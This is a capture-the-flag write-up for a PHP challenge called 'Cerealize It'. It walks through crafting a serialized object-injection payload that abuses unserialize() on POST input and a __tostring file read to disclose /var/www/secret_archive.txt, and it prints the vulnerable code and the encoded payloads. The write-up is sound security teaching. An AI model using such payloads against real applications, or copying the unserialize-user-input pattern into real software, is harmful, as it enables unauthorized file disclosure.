# Cerealize It
---
## Description
Cerealize is described as Wikipedia for cereals. The cerealize page states:
> Since we're still in development, we don't have a fancy frontend for submitting a new cereal for the archive. Instead, just give us a POST request with a "cereal" parameter. Just for fun, why don't you serialize it? We've open-sourced the project, so you can see what format we're expecting by checking out the code.
---
## Info Gathering
cerealize.php contains:
```
{
	class cereal{
		public $cereal_name;
		public $cereal_flavor;
		public $cereal_brand;

		public function submission_result(){
			echo "Thanks for submitting a new cereal for our archive!";
		}
		public function display_submission(){
			echo "You told us about" . $this->cereal_name . "; we'll see if it's in our archive! If not, we'll add it.";
		}
	}

	$cereal_submission = unserialize($_POST['cereal']);
	if ($cereal_submission){
		$cereal_submission->submission_result();
		if($cereal_submission->cereal_name && $cereal_submission->cereal_flavor && $cereal_submission->cereal_brand){
			$cereal_submission->display_submission();
		}
	}
	else{
		echo "Sorry, something's wrong with your cereal submission. Please try again.";
	}
}
```

It also includes archive_reader.php, which contains:
```
{
	// all the secret proprietary cereals we signed NDAs to try are stored in a file
	// at /var/www/secret_archive.txt -- be sure to keep those hidden when we open-source our project!
	class secret_cereal_archive{
		public function __tostring(){
			return file_get_contents($this->filename);
		}
              }
}
```
Based on the above, we want to:
* POST a 'cereal' parameter 
* Somehow, connect the 'cereal' parameter to the secret_cereal_archive class because it can open a file, presumably the /var/www/secret_archive.txt file. 
---
## Attempt \#1 : POSTing a random cereal value
First, we want to see if we can successfully POST a value for cereal. I used ZAP's Request Editor to modify the initial GET request for cerealize.php and change its method to POST. Then I added a token value in the parameter, `cereal=A` and submitted the request.

Initially, this failed with an error on this line, indicating the cereal parameter was not found. 
```
{
	$cereal_submission = unserialize($_POST['cereal']);
}
```

This was very puzzling since I _had_ sent the parameter. After some discussion on the forums, it turns out I needed to set the Content-Type to application/x-www-form-urlencoded. Per https://stackoverflow.com/questions/4007969/application-x-www-form-urlencoded-or-multipart-form-data, “; if you have binary (non-alphanumeric) data (or a significantly sized payload) to transmit, use multipart/form-data. Otherwise, use application/x-www-form-urlencoded.”
 
After this change, I was able to send the request again, and it failed in the following line, indicating it had found the cereal paramter but the format was incorrect. Progress!
```
{
		if($cereal_submission->cereal_name && $cereal_submission->cereal_flavor && $cereal_submission->cereal_brand){
}
```

## Attempt \#2: POSTing a good cereal value
Looking at cerealize.php, it expects a well-formed cereal class with cereal_name and cereal_flavor member variables. 

To test this, we go to an online PHP serializer website like https://onlinephp.io/code/fromFunction/serialize?e=1&v=0:
There, we give the definition for the cereal class, then instantiate it with nice values. 
```
{
	class cereal{
			public $cereal_name;
			public $cereal_flavor;
			public $cereal_brand;
	
			public function submission_result(){
				echo "Thanks for submitting a new cereal for our archive!";
			}
			public function display_submission(){
				echo "You told us about" . $this->cereal_name . "; we'll see if it's in our archive! If not, we'll add it.";
			}
		}
	$a = new cereal;
	$a->cereal_name='A';
	$a->cereal_flavor='B';
	$a->cereal_brand='C';
	echo serialize($a);
}
```
This gives a value `O:6:"cereal":3:{s:11:"cereal_name";s:1:"A";s:13:"cereal_flavor";s:1:"B";s:12:"cereal_brand";s:1:"C";}`

We want to HTML encode this, so we go to an encoder/decoder (in my case, I used ZAP's Encoder/Decoder utility). This gives
```
{
O%3A6%3A%22cereal%22%3A3%3A%7Bs%3A11%3A%22cereal_name%22%3Bs%3A1%3A%22A%22%3Bs%3A13%3A%22cereal_flavor%22%3Bs%3A1%3A%22B%22%3Bs%3A12%3A%22cereal_brand%22%3Bs%3A1%3A%22C%22%3B%7D
}
```

Back on the ZAP Request Editor, we replace the value for the cereal parameter with the block above, and send it. This time, we get the happy message "You told us aboutA; we'll see if it's in our archive!".

## Attempt \# 3: Sending a cereal value to show the flag
Now, we want to get the flag value. It seems like we want the cereal_name to connect to secret_archive_reader, and we want to create secret_archive_reader to read the secret file by setting its ($this->filename) member variable. This is not hard because variables are public by default in PHP, so we can instantiate the secret_archive_reader and set it directly. 

Back at the online serializer, we supply the class definitions it needs and create the cereal as before, except this time cereal_name points to an secret_cereal_archive instance. 
```
{
<?php 
	class secret_cereal_archive{
			public function __tostring(){
				return file_get_contents($this->filename);
			}
		}
	
	class cereal{
			public $cereal_name;
			public $cereal_flavor;
			public $cereal_brand;
	
			public function submission_result(){
				echo "Thanks for submitting a new cereal for our archive!";
			}
			public function display_submission(){
				echo "You told us about" . $this->cereal_name . "; we'll see if it's in our archive! If not, we'll add it.";
			}
		}
	$b = new secret_cereal_archive;
	$b->filename = "/var/www/secret_archive.txt";
	
	$a = new cereal;
	$a->cereal_name=$b;
	$a->cereal_flavor='B';
	$a->cereal_brand='C';
	echo serialize($a);
}
```

Running this returns `O:6:"cereal":3:{s:11:"cereal_name";O:21:"secret_cereal_archive":1:{s:8:"filename";s:27:"/var/www/secret_archive.txt";}s:13:"cereal_flavor";s:1:"B";s:12:"cereal_brand";s:1:"C";}. `

Back to ZAP, we run it through the Encode/Decode:
```
{
O%3A6%3A%22cereal%22%3A3%3A%7Bs%3A11%3A%22cereal_name%22%3BO%3A21%3A%22secret_cereal_archive%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A27%3A%22%2Fvar%2Fwww%2Fsecret_archive.txt%22%3B%7Ds%3A13%3A%22cereal_flavor%22%3Bs%3A1%3A%22B%22%3Bs%3A12%3A%22cereal_brand%22%3Bs%3A1%3A%22C%22%3B%7D
}
```
Then send it on the request - voila, the flag reminding us not to serialize user input, `flag{d0nt_d3s3r1l1z3_us3r_1nput}`